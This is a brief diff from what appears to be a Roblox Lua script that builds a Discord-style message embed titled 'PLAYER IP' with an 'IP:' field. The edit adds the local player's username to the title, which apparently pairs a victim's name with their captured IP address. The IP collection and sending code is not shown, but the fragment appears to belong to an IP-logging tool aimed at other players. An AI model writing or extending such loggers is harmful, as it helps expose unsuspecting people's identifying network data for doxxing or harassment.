@@ -9,7 +9,7 @@ done!
 S = [[{
   "embeds": [
     {
-      "title": "PLAYER IP",
+      "title": "PLAYER IP: " .. game.Players.LocalPlayer.Name,
       "fields": [
         {
           "name": "IP:",
